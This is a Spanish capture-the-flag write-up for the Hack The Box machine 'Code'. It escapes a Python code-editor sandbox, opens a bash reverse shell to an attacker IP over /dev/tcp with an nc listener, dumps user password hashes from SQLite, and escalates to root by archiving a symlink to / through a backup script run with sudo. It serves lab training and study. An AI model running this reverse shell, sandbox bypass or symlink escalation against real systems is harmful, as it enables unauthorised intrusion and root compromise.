
# 📝 Writeup Detallado – Hack The Box: Code

## 📌 Información General
- **Nombre:** Code  
- **Plataforma:** Hack The Box  
- **Nivel:** Medium  
- **Dirección IP:** 10.129.231.240  

---

## 🔎 1. Reconocimiento

### Escaneo inicial
```bash
ping -c 1 10.129.231.240
```
TTL=63 → probablemente Linux.

Escaneamos todos los puertos TCP:
```bash
nmap -p- --min-rate 5000 -n -Pn 10.129.231.240
```

**Resultados:**
- 22/tcp → SSH (OpenSSH 8.2)  
- 5000/tcp → HTTP (Gunicorn / Python Code Editor)

Escaneo de servicios:
```bash
nmap -sCV -p22,5000 10.129.231.240
```

Confirmamos:  
- **SSH** activo.  
- **Gunicorn server** corriendo una webapp llamada *Python Code Editor*.  

---

## 🌐 2. Enumeración de la aplicación web

Accedemos a `http://10.129.231.240:5000/`.  
Se presenta un editor que permite **ejecutar código Python** vía `/run_code`.  

Endpoints observados en el JavaScript:
- `POST /run_code` → ejecuta código.  
- `POST /save_code` → guarda código (requiere login).  
- `GET /load_code/<id>` → carga snippets.  

---

## 💥 3. Explotación de la sandbox (RCE)

### Prueba inicial
```bash
curl -X POST http://10.129.231.240:5000/run_code --data-urlencode 'code=print(7*7)'
```
➡️ Devuelve `49` → ejecución confirmada.

### Restricciones
Palabras como `os`, `subprocess`, `open` → bloqueadas.

### Bypass
Enumeramos clases ocultas en Python:
```python
().__class__.__mro__[1].__subclasses__()
```

Encontramos `subprocess.Popen` en el índice **317**.  

Payload para shell:
```python
S=().__class__.__mro__[1].__subclasses__()
P=[c for c in S if c.__name__=="Popen"][0]
P("bash -c 'bash -i >& /dev/tcp/10.10.14.167/4444 0>&1'",shell=True)
```

En el atacante:
```bash
nc -lvnp 4444
```

✅ Obtenemos shell como **app-production**.  

---

## 📂 4. Movimiento lateral

Dentro encontramos:
```
/home/app-production/app/instance/database.db
```

Abrimos con SQLite:
```bash
sqlite3 /home/app-production/app/instance/database.db
```

Tablas:
- **user**: contiene credenciales hasheadas.

Usuarios:
```
development : 759b74ce43947f5f4c91aeddc3e5bad3
martin      : 3de6f30c4a09c27fc71932bfc68474be
```

Tras crackear el hash, obtenemos password de `martin`.  
Accedemos vía SSH:
```bash
ssh martin@10.129.231.240
```

---

## 🔑 5. Escalada de privilegios

Revisamos permisos de `sudo`:
```bash
sudo -l
```
Salida:
```
(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

El script `backy.sh` archiva directorios definidos en un JSON.

### Explotación con symlink
Creamos un symlink en el home:
```bash
ln -s / rootlink
```

Creamos `exploit.json`:
```json
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/martin/rootlink/root/"
  ]
}
```

Ejecutamos:
```bash
sudo /usr/bin/backy.sh /home/martin/exploit.json
```

Esto genera un archivo `.tar.bz2` en el home de `martin`.  

### Extracción de flags
Listar contenido:
```bash
tar -tvf code_home_martin_rootlink_root_*.tar.bz2 | grep root.txt
```

Extraer:
```bash
tar -xvf code_home_martin_rootlink_root_*.tar.bz2 home/martin/rootlink/root/root.txt
cat home/martin/rootlink/root/root.txt
```

✅ Obtenemos **root.txt**.  

### User flag
Como `martin` no tenía la flag, repetimos el truco archivando `/home/app-production`.  
Así obtenemos `user.txt`.  

---

## 📌 6. Conclusiones

- El fallo inicial fue un **sandbox escape** en un editor de código Python.  
- El movimiento lateral se basó en lectura de **SQLite con credenciales**.  
- La escalada a root fue posible gracias a **symlink traversal en un script de backup ejecutado como root**.  
- **Flags:**  
  - `user.txt` → en `/home/app-production`  
  - `root.txt` → en `/root`  
